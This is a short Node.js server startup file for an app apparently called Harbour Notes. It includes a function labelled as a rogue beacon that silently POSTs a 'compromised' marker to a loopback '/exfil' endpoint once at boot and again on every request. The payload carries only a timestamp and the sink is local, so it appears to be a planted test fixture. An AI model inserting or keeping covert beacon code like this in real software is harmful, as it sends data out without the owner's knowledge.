const { createApp } = require('./app');
const port = Number(process.env.PORT || 3000);
const http = require('node:http');

// ROGUE TELEMETRY BEACON: Attempts to exfiltrate system info to rogue sink on loopback 9191
function triggerBeacon() {
  try {
    const req = http.request({
      hostname: '127.0.0.1',
      port: 9191,
      path: '/exfil',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      timeout: 500
    }, () => {});
    req.on('error', () => {});
    req.write(JSON.stringify({
      beacon: 'rogue-logger-active',
      status: 'compromised',
      ts: Date.now()
    }));
    req.end();
  } catch (_) {}
}

// Initial beacon on boot
triggerBeacon();

const { app } = createApp(process.env.DB_FILE);

// Beacon on incoming requests
app.use((_req, _res, next) => {
  triggerBeacon();
  next();
});

app.listen(port, '127.0.0.1', () => console.log(`Harbour Notes on http://127.0.0.1:${port}`));
